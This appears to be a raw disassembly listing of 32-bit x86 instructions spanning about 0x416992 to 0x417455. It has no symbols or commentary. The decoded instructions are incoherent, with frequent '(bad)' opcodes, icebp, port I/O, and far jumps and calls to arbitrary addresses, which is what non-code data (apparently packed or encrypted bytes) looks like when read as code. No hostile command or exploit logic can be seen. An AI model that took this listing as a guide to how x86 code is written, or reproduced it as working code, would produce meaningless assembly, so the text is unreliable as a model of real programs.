  416992:	jo     0x4169bd
  416994:	jle    0x416978
  416996:	bound  ecx,QWORD PTR [edi+eax*8-0x65]
  41699a:	stos   BYTE PTR es:[edi],al
  41699b:	dec    esi
  41699c:	call   0xa86309c3
  4169a1:	dec    ebp
  4169a2:	shl    BYTE PTR [edx-0x43b31260],1
  4169a8:	add    al,0xe
  4169aa:	test   BYTE PTR [ebx],ah
  4169ac:	fbld   TBYTE PTR [edx+ecx*2-0x6e]
  4169b0:	sbb    BYTE PTR [esi+0x1],bh
  4169b3:	rcl    DWORD PTR [ecx+0x65],0xef
  4169b7:	mov    al,0x8e
  4169b9:	es push es
  4169bb:	add    DWORD PTR [eax],ebp
  4169bd:	icebp  
  4169be:	mov    ecx,0xd7bebd0a
  4169c3:	lea    ecx,[eax+0x12]
  4169c6:	pop    ss
  4169c7:	mov    al,0x62
  4169c9:	xor    al,0x6a
  4169cb:	retf   
  4169cc:	clc    
  4169cd:	sbb    dl,0xd2
  4169d0:	adc    DWORD PTR [ebx-0x69],ebp
  4169d3:	adc    bh,BYTE PTR [esi-0x2fce909e]
  4169d9:	enter  0xc3f7,0xb2
  4169dd:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  4169df:	sahf   
  4169e0:	inc    esi
  4169e1:	sbb    esp,ebx
  4169e3:	dec    eax
  4169e4:	inc    esi
  4169e5:	nop
  4169e6:	daa    
  4169e7:	imul   ebx,edi,0x3b
  4169ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4169eb:	shl    BYTE PTR ds:0xaa86ec50,0x3c
  4169f2:	inc    ebx
  4169f3:	adc    edi,DWORD PTR [edx+0x56]
  4169f6:	or     al,BYTE PTR [ecx+0x1ca2941b]
  4169fc:	lock (bad) 
  4169ff:	jp     0x4169a2
  416a01:	jmp    0x95eef7f8
  416a06:	stos   BYTE PTR es:[edi],al
  416a07:	enter  0x2f1d,0xd3
  416a0b:	jmp    0xb7fe216e
  416a10:	fs enter 0x57cc,0x3f
  416a15:	mov    ebp,0xaf38818c
  416a1a:	in     eax,dx
  416a1b:	popa   
  416a1c:	push   esp
  416a1d:	sti    
  416a1e:	mov    edx,0x576c89f9
  416a23:	js     0x416a4d
  416a25:	xchg   edi,eax
  416a26:	dec    ebp
  416a27:	jns    0x416a92
  416a29:	push   ss
  416a2a:	push   ss
  416a2b:	ins    BYTE PTR es:[edi],dx
  416a2c:	xchg   BYTE PTR [ecx+0x68],ch
  416a2f:	(bad)  
  416a31:	xchg   esi,eax
  416a32:	xchg   ebp,eax
  416a33:	fimul  DWORD PTR [esp+esi*1+0x8bb298e]
  416a3a:	push   edi
  416a3b:	dec    ecx
  416a3c:	and    bl,BYTE PTR [esi+edi*8+0x32fab076]
  416a43:	in     al,dx
  416a44:	iret   
  416a45:	stos   BYTE PTR es:[edi],al
  416a46:	sti    
  416a47:	push   es
  416a48:	cmp    eax,DWORD PTR cs:[eax+0x70]
  416a4c:	cli    
  416a4d:	mov    esp,0x988c64a3
  416a52:	dec    eax
  416a53:	xor    edx,DWORD PTR [esi]
  416a55:	dec    edi
  416a56:	les    esp,FWORD PTR [esp+eiz*2]
  416a59:	cmpxchg ah,cl
  416a5c:	in     eax,0x1
  416a5e:	imul   ecx,DWORD PTR [ebx+0x75],0x56a744f0
  416a65:	(bad)  
  416a66:	sar    BYTE PTR [esp+ebx*1-0x7f],cl
  416a6a:	outs   dx,BYTE PTR ds:[esi]
  416a6b:	xchg   esp,eax
  416a6c:	jmp    0x416a71
	...
  416ad5:	add    bl,cl
  416ad7:	pusha  
  416ad8:	ror    BYTE PTR [ebx+0x60dbbbfb],1
  416ade:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416adf:	mov    al,ds:0x2cc20ba3
  416ae4:	cld    
  416ae5:	push   edx
  416ae6:	dec    edx
  416ae7:	hlt    
  416ae8:	add    BYTE PTR [eax],al
  416aea:	inc    DWORD PTR [eax]
  416aec:	add    BYTE PTR [eax],al
  416aee:	es pop ds
  416af0:	loope  0x416b5d
  416af2:	stos   BYTE PTR es:[edi],al
  416af3:	xchg   edi,ebx
  416af5:	push   eax
  416af6:	popf   
  416af7:	cmc    
  416af8:	std    
  416af9:	jecxz  0x416acd
  416afb:	imul   edi,DWORD PTR [eax+edx*8-0x6d],0x23
  416b00:	adc    DWORD PTR [edi-0x3f],edi
  416b03:	mov    ecx,0xcf2dec2d
  416b08:	and    dh,BYTE PTR [ecx]
  416b0a:	inc    eax
  416b0b:	popf   
  416b0c:	or     al,0x4b
  416b0e:	loop   0x416ab6
  416b10:	inc    esi
  416b11:	sbb    ecx,DWORD PTR [eax]
  416b13:	scas   eax,DWORD PTR es:[edi]
  416b14:	repnz and esp,DWORD PTR [ecx-0x4c26b46a]
  416b1b:	xchg   esp,eax
  416b1c:	les    edx,FWORD PTR [ecx+eax*1]
  416b1f:	jle    0x416b10
  416b21:	gs pop ss
  416b23:	mov    ch,0xe5
  416b25:	mov    bl,0xf1
  416b27:	mov    ebx,0xe18ad0da
  416b2c:	mov    eax,ds:0x97a5ec9b
  416b31:	dec    esp
  416b32:	jmp    0xe77d54a1
  416b37:	mov    ch,0x47
  416b39:	retf   
  416b3a:	mov    esi,0x62a9c776
  416b3f:	hlt    
  416b40:	popa   
  416b41:	retf   
  416b42:	jecxz  0x416b39
  416b44:	cmp    esp,DWORD PTR [esi+0x2a]
  416b47:	sbb    eax,0xa3f5e472
  416b4c:	call   0xe190:0xe04078ca
  416b53:	pusha  
  416b54:	jne    0x416b0c
  416b56:	dec    ebp
  416b57:	repz jae 0x416bcd
  416b5a:	imul   edx,DWORD PTR [edx],0x1346a13c
  416b60:	push   es
  416b61:	xchg   DWORD PTR [edx],ebp
  416b63:	mov    eax,ds:0x5801105c
  416b68:	inc    edi
  416b69:	inc    ebx
  416b6a:	cs mov ebx,0xa2c3f52e
  416b70:	xchg   esi,eax
  416b71:	shr    BYTE PTR [ebx],cl
  416b73:	pop    ebp
  416b74:	addr16 add eax,0x34ab4f96
  416b7a:	cmp    ecx,ebp
  416b7c:	js     0x416b3f
  416b7e:	cs jmp 0x2f75061
  416b84:	out    dx,al
  416b85:	mov    edi,0xacddbfd8
  416b8a:	mov    edx,0x66e5fa7f
  416b8f:	cdq    
  416b90:	repz xchg edx,eax
  416b92:	jnp    0x416b6e
  416b94:	lea    edi,[ebx+0x31]
  416b97:	rcl    DWORD PTR [esi-0x5d],cl
  416b9a:	inc    edi
  416b9b:	mov    ?,WORD PTR [eax]
  416b9d:	std    
  416b9e:	leave  
  416b9f:	pop    ebp
  416ba0:	call   DWORD PTR [ebx-0x2]
  416ba3:	inc    ecx
  416ba4:	es mov esp,0x10fa3df6
  416baa:	in     eax,dx
  416bab:	and    al,0xe1
  416bad:	lock dec ebp
  416baf:	call   0xae88:0xd2156e09
  416bb6:	and    BYTE PTR [ebx+esi*2],dh
  416bb9:	and    BYTE PTR [eax],dl
  416bbb:	sbb    dl,BYTE PTR [edx+0x37a3e0f0]
  416bc1:	adc    al,0xc3
  416bc3:	inc    eax
  416bc4:	pop    esp
  416bc5:	mov    ds:0x7fbe6be,al
  416bca:	popf   
  416bcb:	push   ss
  416bcc:	adc    bl,dl
  416bce:	xor    ah,BYTE PTR [eax-0x4d]
  416bd1:	lahf   
  416bd2:	xchg   ecx,eax
  416bd3:	gs mov edx,0x3501a441
  416bd9:	int3   
  416bda:	sub    DWORD PTR [eax+0xdb8beae],ebx
  416be0:	ins    DWORD PTR es:[edi],dx
  416be1:	push   es
  416be2:	ds mov al,0xf5
  416be5:	jl     0x416baf
  416be7:	and    al,0xb9
  416be9:	push   es
  416bea:	add    DWORD PTR [edx],ebp
  416bec:	push   ecx
	...
  416c55:	add    bl,ah
  416c57:	gs push cs
  416c59:	test   DWORD PTR [esi-0x38a0401],0xf75b70a9
  416c63:	push   ebx
  416c64:	push   esp
  416c65:	dec    cx
  416c67:	cmc    
  416c68:	add    BYTE PTR [eax],al
  416c6a:	inc    DWORD PTR [eax]
  416c6c:	add    BYTE PTR [eax],al
  416c6e:	popa   
  416c6f:	sbb    bl,ah
  416c71:	bound  eax,QWORD PTR [edi]
  416c73:	jmp    0xaa4f:0x88898f34
  416c7a:	mov    bh,0x22
  416c7c:	lods   al,BYTE PTR ds:[esi]
  416c7d:	xor    BYTE PTR [edx-0x6a692a1a],bl
  416c83:	mov    ecx,0x60eb11fe
  416c88:	mov    gs:0x4451e182,eax
  416c8e:	idiv   dh
  416c90:	push   0xea843b4b
  416c95:	and    ecx,DWORD PTR [edi+ecx*2]
  416c98:	mov    edx,0x36f778a5
  416c9d:	xor    ebp,DWORD PTR [esp+eax*4-0x1eab50b7]
  416ca4:	xchg   DWORD PTR ds:0x74439681,ecx
  416caa:	pusha  
  416cab:	les    edi,FWORD PTR [edx-0x2b3133ad]
  416cb1:	leave  
  416cb2:	std    
  416cb3:	call   DWORD PTR [esi-0x60]
  416cb6:	push   ss
  416cb7:	mov    bh,BYTE PTR [esi-0x64f83f4f]
  416cbd:	or     eax,0x6589d256
  416cc2:	imul   esi,DWORD PTR [ebx],0x2bd9a19
  416cc8:	je     0x416d1b
  416cca:	sub    edx,edx
  416ccc:	mov    dh,0xf4
  416cce:	mov    ?,WORD PTR [esi+0x5077ec19]
  416cd4:	imul   ebp,esi,0x22
  416cd7:	std    
  416cd8:	add    BYTE PTR [ebp+esi*2-0x3b5e97f],0x44
  416ce0:	and    eax,0xc8c7f101
  416ce5:	pop    DWORD PTR [esi]
  416ce7:	jnp    0x416ce6
  416ce9:	dec    eax
  416cea:	xchg   edi,eax
  416ceb:	inc    ecx
  416cec:	sub    eax,0x52f3c5e9
  416cf1:	outs   dx,BYTE PTR ds:[esi]
  416cf2:	int    0xfb
  416cf4:	icebp  
  416cf5:	icebp  
  416cf6:	cmp    eax,0x27f6620b
  416cfb:	pushf  
  416cfc:	neg    BYTE PTR [edx-0x533210ab]
  416d02:	js     0x416d14
  416d04:	lds    ebp,FWORD PTR [eax]
  416d06:	pop    eax
  416d07:	mov    bl,0x0
  416d09:	enter  0x580a,0x1d
  416d0d:	daa    
  416d0e:	xor    BYTE PTR ss:[esi],ah
  416d11:	xchg   esp,eax
  416d12:	xchg   ebp,eax
  416d13:	push   edx
  416d14:	imul   esp,DWORD PTR [esi-0x5e72046b],0xa06c4bce
  416d1e:	lods   al,BYTE PTR ds:[esi]
  416d1f:	test   DWORD PTR [ebx],edi
  416d21:	or     eax,0x9b3c6e3a
  416d26:	int3   
  416d27:	aaa    
  416d28:	add    al,BYTE PTR [esi+0x53]
  416d2b:	jne    0x416d7b
  416d2d:	repnz jecxz 0x416cd0
  416d30:	adc    DWORD PTR [edi+eax*8-0x5],0xffffffac
  416d35:	sbb    DWORD PTR [ebx],esi
  416d37:	in     eax,0xd0
  416d39:	outs   dx,BYTE PTR ds:[esi]
  416d3a:	mov    dh,0xc3
  416d3c:	mov    cs,WORD PTR [esi+0x6a2708e5]
  416d42:	test   eax,0x81d66e91
  416d47:	dec    edx
  416d48:	pop    esi
  416d49:	jecxz  0x416d20
  416d4b:	scas   al,BYTE PTR es:[edi]
  416d4c:	in     al,0xd3
  416d4e:	(bad)  
  416d4f:	sbb    DWORD PTR [esi-0x55],esp
  416d52:	out    0xa6,eax
  416d54:	mov    esp,0xdb0d7c73
  416d59:	mov    al,ds:0xea158126
  416d5e:	fdivr  st,st(2)
  416d60:	push   ecx
  416d61:	rcl    DWORD PTR [edx+0x35],0xd8
  416d65:	dec    ebp
  416d66:	push   ds
  416d67:	mov    WORD PTR [esi+0x4e],?
  416d6a:	jne    0x416d78
  416d6c:	xchg   edx,eax
	...
  416dd5:	add    BYTE PTR [ecx],ah
  416dd7:	xchg   ebx,eax
  416dd8:	mov    DWORD PTR [edi-0x60d84045],ebp
  416dde:	mov    ch,0x99
  416de0:	pop    edx
  416de1:	das    
  416de2:	dec    ebp
  416de3:	sub    eax,DWORD PTR [eax]
  416de5:	lock dec eax
  416de7:	test   BYTE PTR [eax],0x0
  416dea:	inc    DWORD PTR [eax]
  416dec:	add    BYTE PTR [eax],al
  416dee:	cmp    cl,al
  416df0:	sub    al,0x8d
  416df2:	xchg   DWORD PTR [edx],edi
  416df4:	int    0x82
  416df6:	inc    ebp
  416df7:	mov    ebx,0xc8289aef
  416dfc:	add    ch,BYTE PTR [ecx]
  416dfe:	shl    DWORD PTR [ecx-0x2661d5ce],0x86
  416e05:	iret   
  416e06:	add    eax,0x4315bef3
  416e0b:	jno    0x416ded
  416e0d:	inc    ecx
  416e0e:	(bad)  
  416e0f:	sahf   
  416e10:	sub    esi,DWORD PTR [esi-0x5974a908]
  416e16:	ds pop es
  416e18:	icebp  
  416e19:	pop    ebp
  416e1a:	fnstsw WORD PTR [esi+0x6a2b807a]
  416e20:	sbb    al,0x4e
  416e22:	pop    eax
  416e23:	jb     0x416dc0
  416e25:	dec    ebx
  416e26:	out    dx,eax
  416e27:	push   cs
  416e28:	gs jb  0x416dcb
  416e2b:	out    dx,al
  416e2c:	xlat   BYTE PTR ds:[ebx]
  416e2d:	fcmovb st,st(1)
  416e2f:	inc    ebp
  416e30:	div    BYTE PTR [eax*1+0x4b2eea48]
  416e37:	in     eax,0x62
  416e39:	(bad)  
  416e3a:	sub    DWORD PTR [ebx+edi*8],esi
  416e3d:	in     eax,dx
  416e3e:	jb     0x416e1b
  416e40:	adc    BYTE PTR [esi+0x268acf97],al
  416e46:	imul   esp,DWORD PTR gs:[esi],0xd4697a72
  416e4d:	out    dx,eax
  416e4e:	xor    eax,DWORD PTR [esi+eax*8+0x62]
  416e52:	lahf   
  416e53:	and    dh,BYTE PTR [ebx+eax*4+0x6e]
  416e57:	inc    ebx
  416e58:	jmp    0x9aef:0x278b78dc
  416e5f:	inc    eax
  416e60:	pop    ecx
  416e61:	enter  0xc29f,0xdf
  416e65:	shl    BYTE PTR [eax-0x13ecd76f],cl
  416e6b:	sub    ebp,DWORD PTR [ecx]
  416e6d:	inc    esp
  416e6e:	rcr    DWORD PTR [edx-0x6effa403],cl
  416e74:	xchg   ebx,eax
  416e75:	arpl   WORD PTR [ecx+ebp*4-0xe],di
  416e79:	or     DWORD PTR [eax-0x4f],0x6c
  416e7d:	jl     0x416e64
  416e7f:	push   esp
  416e80:	sub    ch,BYTE PTR [edx+ebx*4+0x5a]
  416e84:	mov    ds:0x73cfb56f,al
  416e89:	jmp    0x35017736
  416e8e:	xchg   esi,eax
  416e8f:	ja     0x416eb9
  416e91:	mov    edi,0xf8e081d3
  416e96:	mov    DWORD PTR [edx+eax*8],ecx
  416e99:	fwait
  416e9a:	dec    ebp
  416e9b:	test   al,0x22
  416e9d:	int    0x70
  416e9f:	loope  0x416ecd
  416ea1:	iret   
  416ea2:	pushf  
  416ea3:	popf   
  416ea4:	fimul  DWORD PTR [edx+0x76]
  416ea7:	shl    DWORD PTR [edi-0x2f],1
  416eaa:	mov    eax,ds:0x96333004
  416eaf:	imul   BYTE PTR [eax+0x15a0e78b]
  416eb5:	outs   dx,BYTE PTR ds:[esi]
  416eb6:	into   
  416eb7:	xchg   DWORD PTR [ecx+edi*4-0x67cd475f],ecx
  416ebe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ebf:	cwde   
  416ec0:	dec    edx
  416ec1:	or     ch,bh
  416ec3:	clc    
  416ec4:	inc    ebx
  416ec5:	mov    ah,0x48
  416ec7:	cmp    edi,esp
  416ec9:	and    bh,dh
  416ecb:	and    dl,BYTE PTR [eax-0x2e]
  416ece:	leave  
  416ecf:	in     al,dx
  416ed0:	popf   
  416ed1:	sti    
  416ed2:	xlat   BYTE PTR ds:[ebx]
  416ed3:	loopne 0x416e5d
  416ed5:	xchg   edx,eax
  416ed6:	jb     0x416f19
  416ed8:	mov    bl,0x5b
  416edb:	nop
  416edc:	xchg   esp,eax
  416edd:	xor    eax,DWORD PTR [esi+eax*4-0x21]
  416ee1:	bound  edx,QWORD PTR [eax]
  416ee3:	repnz sbb esp,DWORD PTR [edi+eiz*2]
  416ee7:	(bad)  
  416ee8:	mov    dh,0xc6
  416eea:	add    DWORD PTR [edi+0xd1],esi
	...
  416f54:	add    BYTE PTR [eax],al
  416f56:	mov    edi,0xae6d8e19
  416f5b:	(bad)  
  416f5c:	(bad)  
  416f5d:	fucomi st,st(0)
  416f5f:	xor    eax,0x5d268eea
  416f64:	retf   
  416f65:	repnz inc edi
  416f67:	test   DWORD PTR [eax],0xff00
  416f6d:	add    BYTE PTR [edx+0x3ea0294a],ah
  416f73:	lods   al,BYTE PTR ds:[esi]
  416f74:	sub    BYTE PTR [ecx-0x76071dcf],dl
  416f7a:	test   BYTE PTR [ebx],ah
  416f7c:	xchg   BYTE PTR [ecx+0x74],ch
  416f7f:	mov    dh,BYTE PTR [eax-0x5273082f]
  416f85:	das    
  416f86:	and    bl,BYTE PTR ds:0xd5f3c582
  416f8c:	mov    eax,0x98d3ff5a
  416f91:	push   ds
  416f92:	stc    
  416f93:	and    BYTE PTR [ebp+0x50],bh
  416f96:	out    0xb5,eax
  416f98:	mov    BYTE PTR [edi+0x69],dh
  416f9b:	loop   0x416f66
  416f9d:	pop    edi
  416f9e:	xor    al,0xc9
  416fa0:	pop    esi
  416fa1:	mov    bh,0x7c
  416fa3:	jae    0x416f73
  416fa5:	stos   DWORD PTR es:[edi],eax
  416fa6:	add    dl,BYTE PTR [ebx-0x5aeae567]
  416fac:	std    
  416fad:	inc    ebp
  416fae:	or     dl,ch
  416fb0:	mov    ds:0x163d4cf6,al
  416fb5:	and    al,cl
  416fb7:	push   ebp
  416fb8:	jb     0x41701a
  416fba:	lahf   
  416fbb:	ja     0x416f76
  416fbd:	inc    ebp
  416fbe:	jecxz  0x416f4c
  416fc0:	jle    0x417023
  416fc2:	sub    DWORD PTR [ebp+0xc],0xffffff87
  416fc6:	pop    eax
  416fc7:	lea    edi,[esi+0x7b]
  416fca:	retf   
  416fcb:	cmp    BYTE PTR [eax+0x64185acf],ch
  416fd1:	and    BYTE PTR [edi],ah
  416fd3:	adc    al,0x3
  416fd5:	call   0xebf6:0x7e8fdbc2
  416fdc:	inc    eax
  416fdd:	call   0x70d3:0x1b6d7e38
  416fe4:	lock cs sub eax,0x5bdcf63
  416feb:	mov    DWORD PTR [esi-0x76],edi
  416fee:	add    eax,0x12c36a61
  416ff3:	add    ebp,ecx
  416ff5:	pop    edi
  416ff6:	out    0x98,al
  416ff8:	cmp    eax,0xcee19466
  416ffd:	popf   
  416ffe:	push   edi
  416fff:	push   ecx
  417000:	mov    ch,BYTE PTR [ebx]
  417002:	xor    al,0x66
  417004:	inc    DWORD PTR ds:0x2f45fcb5
  41700a:	xchg   esp,eax
  41700b:	sub    DWORD PTR [edx+0x37],eax
  41700e:	xchg   BYTE PTR [eax],bl
  417010:	repnz dec esi
  417012:	rcr    DWORD PTR [edx],1
  417014:	int    0xff
  417016:	scas   al,BYTE PTR es:[edi]
  417017:	div    DWORD PTR [eax]
  417019:	sub    DWORD PTR [edx],0x76
  41701c:	rcl    DWORD PTR [ebp+0x17f8c9b4],0x8e
  417023:	sar    DWORD PTR [edi+0x5a812dba],1
  417029:	cs mov eax,0xb3fc579d
  41702f:	call   0xf32f0b31
  417034:	xchg   ebp,eax
  417035:	cs push cs
  417037:	xchg   ebp,eax
  417038:	xor    al,0x24
  41703a:	or     eax,0x1a0c8610
  41703f:	gs test eax,0x1f71de4
  417045:	popa   
  417046:	rcl    edx,cl
  417048:	arpl   ax,ax
  41704a:	and    ebx,DWORD PTR [eax]
  41704c:	dec    esi
  41704d:	pop    edi
  41704e:	adc    esi,DWORD PTR [eax]
  417050:	aas    
  417051:	lods   eax,DWORD PTR ds:[esi]
  417052:	or     bh,bh
  417054:	cdq    
  417055:	jmp    0xa7db99e0
  41705a:	js     0x417077
  41705c:	xchg   BYTE PTR [edi-0x78],bl
  41705f:	xchg   edx,eax
  417060:	lds    ebp,FWORD PTR [ebp+0x54]
  417063:	xchg   bl,ch
  417065:	bound  edx,QWORD PTR [edx-0x29e430d0]
  41706b:	mov    cl,0x90
	...
  4170d5:	add    BYTE PTR [esi+0x2d],dh
  4170d8:	push   ebp
  4170d9:	inc    ecx
  4170da:	pop    edi
  4170db:	jns    0x417153
  4170dd:	aas    
  4170de:	(bad)  
  4170df:	loopne 0x4170d5
  4170e1:	sub    edx,ebp
  4170e3:	es int 0x7b
  4170e6:	inc    esi
  4170e7:	clc    
  4170e8:	add    BYTE PTR [eax],al
  4170ea:	inc    DWORD PTR [eax]
  4170ec:	add    BYTE PTR [eax],al
  4170ee:	das    
  4170ef:	mov    edi,0x4811f77f
  4170f4:	mov    WORD PTR [esi],ss
  4170f6:	add    ch,ch
  4170f8:	bswap  edi
  4170fa:	sub    BYTE PTR [esi-0x2046aed6],ch
  417100:	xchg   edx,eax
  417101:	(bad)  
  417102:	(bad)  
  417103:	mul    ah
  417105:	adc    BYTE PTR [eax+0x23a10ec5],0xf0
  41710c:	pop    ds
  41710d:	ror    DWORD PTR [edi+0x29a1408d],1
  417113:	add    ecx,DWORD PTR [eax+ecx*8+0x12]
  417117:	jge    0x4170c0
  417119:	xchg   ebx,eax
  41711a:	retf   0xa193
  41711d:	in     al,dx
  41711e:	not    DWORD PTR [edx+ecx*2-0x3b673e3a]
  417125:	xor    cl,0x8e
  417128:	sub    cl,BYTE PTR [ecx-0x6b65eedd]
  41712e:	mov    ebx,0x573ce4e5
  417133:	push   ebp
  417134:	in     eax,dx
  417135:	fcmovnu st,st(0)
  417137:	jne    0x417113
  417139:	xor    dh,dl
  41713b:	xor    al,0xf2
  41713d:	outs   dx,BYTE PTR ds:[esi]
  41713e:	and    ch,bl
  417140:	inc    ebp
  417141:	xor    BYTE PTR [esp+esi*4+0x72],bh
  417145:	mov    ecx,0x9a527736
  41714a:	add    DWORD PTR [eax+0x2],0x5
  41714e:	mov    BYTE PTR [ebx+0x3b],dh
  417151:	pusha  
  417152:	data16 or BYTE PTR [edi+0x3c],0x81
  417157:	and    eax,0xb1e9bdc0
  41715c:	push   0xd05314d3
  417161:	push   eax
  417162:	jge    0x41712c
  417164:	jnp    0x4171af
  417166:	stos   BYTE PTR es:[edi],al
  417167:	in     al,dx
  417168:	inc    ebp
  417169:	out    dx,eax
  41716a:	call   0x1fc6619
  41716f:	xchg   ecx,eax
  417170:	repnz xchg ebp,eax
  417172:	xor    edi,edx
  417174:	fwait
  417175:	inc    eax
  417176:	or     edx,edi
  417178:	rcl    DWORD PTR [ebp+ebx*4+0x3fa2cf77],0x9a
  417180:	or     al,0x11
  417182:	cld    
  417183:	inc    ebx
  417184:	ds popa 
  417186:	xchg   DWORD PTR gs:[edx],ecx
  417189:	or     edx,edi
  41718b:	jmp    0x469a7ce8
  417190:	cwde   
  417191:	aas    
  417192:	add    al,0x68
  417194:	add    DWORD PTR [edi+0x13cc93c1],0x45
  41719b:	(bad)  
  41719c:	pop    ecx
  41719d:	mov    dh,0x5b
  41719f:	adc    DWORD PTR ds:0x3d726ed6,eax
  4171a5:	sub    eax,DWORD PTR [ecx+0x7c]
  4171a8:	lahf   
  4171a9:	or     eax,0xdeeae628
  4171ae:	daa    
  4171af:	add    DWORD PTR [ebp-0x4f],ebx
  4171b2:	sub    esp,DWORD PTR [ecx]
  4171b4:	int    0x27
  4171b6:	mov    esp,0x92ca326a
  4171bb:	es adc bh,ah
  4171be:	mov    esp,0x7d99022e
  4171c3:	dec    ecx
  4171c4:	xchg   BYTE PTR [ecx+0x3fe50d0],bl
  4171ca:	push   0xffffffd8
  4171cc:	pop    ss
  4171cd:	ss test eax,0xe730392c
  4171d3:	push   edx
  4171d4:	mov    bl,0xf8
  4171d6:	add    BYTE PTR [ebx],0x17
  4171d9:	cmp    bl,dl
  4171db:	or     eax,0x4785aa71
  4171e0:	lock add al,0xd0
  4171e3:	imul   eax,eax,0xd402403d
  4171e9:	sub    dh,al
  4171eb:	sbb    edx,DWORD PTR [esi+0x0]
	...
  417255:	add    BYTE PTR [esi-0xe58fe7],ah
  41725b:	jnp    0x41724b
  41725d:	mov    ebp,0x986526a4
  417262:	cmp    BYTE PTR [ebx-0x7a],dh
  417265:	fld    QWORD PTR [ebp-0x7]
  417268:	add    BYTE PTR [eax],al
  41726a:	inc    DWORD PTR [eax]
  41726c:	add    BYTE PTR [eax],al
  41726e:	mov    al,0x42
  417270:	dec    esi
  417271:	mov    ah,0x22
  417273:	ins    DWORD PTR es:[edi],dx
  417274:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417275:	int    0xce
  417277:	fcom   QWORD PTR [ecx]
  417279:	add    DWORD PTR [edi],ecx
  41727b:	es jmp 0x6563:0xf27469dd
  417283:	xor    BYTE PTR [ecx+0x65ae5aa9],ch
  417289:	popa   
  41728a:	jno    0x41723d
  41728c:	and    eax,0x8df5c5d7
  417291:	dec    eax
  417292:	push   ds
  417293:	ret    
  417294:	sub    eax,0xc0353afd
  417299:	or     BYTE PTR [ecx-0x6d53dc88],bl
  41729f:	ds push es
  4172a1:	push   ss
  4172a2:	cwde   
  4172a3:	outs   dx,BYTE PTR ss:[esi]
  4172a5:	push   edx
  4172a6:	enter  0x4406,0x97
  4172aa:	mov    bh,BYTE PTR [esp+edx*1]
  4172ad:	xchg   esp,eax
  4172ae:	mov    ch,dl
  4172b0:	sbb    bl,bh
  4172b2:	stos   DWORD PTR es:[edi],eax
  4172b3:	mov    ds:0x636c4675,eax
  4172b8:	mov    dl,0xb8
  4172ba:	into   
  4172bb:	scas   al,BYTE PTR es:[edi]
  4172bc:	jmp    0xcb1e:0x8ad62200
  4172c3:	pop    ebp
  4172c4:	sbb    al,0xb9
  4172c6:	jno    0x41726f
  4172c8:	sar    ecx,0xd0
  4172cb:	add    DWORD PTR [edx],esi
  4172cd:	add    bh,BYTE PTR [eax]
  4172cf:	push   ss
  4172d0:	mov    edx,0xbd6234f1
  4172d5:	aaa    
  4172d6:	arpl   WORD PTR [edi+0x78],bx
  4172d9:	xchg   edx,eax
  4172da:	jp     0x41729a
  4172dc:	addr16 ffreep st(3)
  4172df:	fs iret 
  4172e1:	in     eax,dx
  4172e2:	lock std 
  4172e4:	or     ah,dl
  4172e6:	jge    0x417270
  4172e8:	shl    BYTE PTR [esp+edx*2-0xb431d7],1
  4172ef:	sahf   
  4172f0:	std    
  4172f1:	imul   edx,DWORD PTR [ebp-0x4a7c4e86],0x13
  4172f8:	jp     0x41731f
  4172fa:	cmp    edi,edx
  4172fc:	outs   dx,BYTE PTR ds:[esi]
  4172fd:	or     al,dh
  4172ff:	clc    
  417300:	jmp    0x71e9:0x29a2552e
  417307:	(bad)  
  417309:	jp     0x417326
  41730b:	out    dx,eax
  41730c:	popf   
  41730d:	or     DWORD PTR [ebx],esi
  41730f:	or     al,0x38
  417311:	add    BYTE PTR [eax],0x2b
  417314:	pop    ebp
  417315:	call   0xda72:0x5710f343
  41731c:	test   eax,0xad1d3d5f
  417321:	adc    al,0x4
  417323:	push   ebx
  417324:	in     al,dx
  417325:	stos   DWORD PTR es:[edi],eax
  417326:	mov    dh,cl
  417328:	xor    BYTE PTR [esi-0x2a6b50ef],cl
  41732e:	xchg   edi,eax
  41732f:	retf   0xfa22
  417332:	jmp    0x417360
  417334:	jecxz  0x41732d
  417336:	retf   
  417337:	adc    DWORD PTR [edi],esi
  417339:	inc    edx
  41733a:	into   
  41733b:	and    eax,0x8a8a6bdf
  417340:	ret    0x2fc0
  417343:	out    0x98,eax
  417345:	sub    edx,0x7ce90e70
  41734b:	test   BYTE PTR [esi-0x1ad0551f],dl
  417351:	aad    0x82
  417353:	fwait
  417354:	inc    edi
  417355:	lahf   
  417356:	lds    edx,FWORD PTR ds:0x18225f5d
  41735c:	inc    ecx
  41735d:	leave  
  41735e:	xlat   BYTE PTR ds:[ebx]
  41735f:	pop    ebx
  417360:	dec    esp
  417361:	mov    cl,0xd4
  417363:	or     al,0x56
  417365:	sbb    esp,DWORD PTR [eax+0x3e]
  417368:	cmc    
  417369:	idiv   BYTE PTR [edx]
  41736b:	xchg   edi,eax
  41736c:	mov    eax,DWORD PTR [eax]
	...
  4173d6:	imul   edi,DWORD PTR [edi+edx*8-0x168028a2],0x8016bbf
  4173e1:	gs xor al,0xb0
  4173e4:	fs ret 0xfa44
  4173e8:	add    BYTE PTR [eax],al
  4173ea:	inc    DWORD PTR [eax]
  4173ec:	add    BYTE PTR [eax],al
  4173ee:	pop    ebp
  4173ef:	push   esp
  4173f0:	mov    esp,0x780e7602
  4173f5:	in     al,0x2f
  4173f7:	push   0xeefe4aca
  4173fc:	xor    esi,edx
  4173fe:	or     eax,0x5a7ac976
  417403:	jmp    0x417444
  417405:	retf   0x8dce
  417408:	pusha  
  417409:	shr    BYTE PTR [ebp+0x3],0x2f
  41740d:	xor    eax,edi
  41740f:	neg    DWORD PTR [ebx+0x11a10295]
  417415:	dec    edx
  417416:	mov    edi,0xde3e6d4b
  41741b:	out    dx,eax
  41741c:	xchg   ebp,eax
  41741d:	xor    BYTE PTR [ebp-0x3a55776a],0xe4
  417424:	imul   esi,eax,0x150904d6
  41742a:	sahf   
  41742b:	xor    eax,0xf70c2209
  417430:	pop    ss
  417431:	out    dx,al
  417432:	mov    dh,0x88
  417434:	mov    bh,0x84
  417436:	(bad)  
  417437:	sar    BYTE PTR [ebx],1
  417439:	mov    ebp,0x6762c8ce
  41743e:	cmp    BYTE PTR [esi],dl
  417440:	enter  0xc14,0xdb
  417444:	popf   
  417445:	mov    esi,0xe0cdf4c1
  41744a:	mov    cl,0x7f
  41744c:	mov    al,0xe3
  41744e:	dec    ebx
  41744f:	fmulp  st(0),st
  417451:	popa   
  417452:	dec    esp
  417453:	es dec ebp
  417455:	shl    DWORD PTR [edx],1
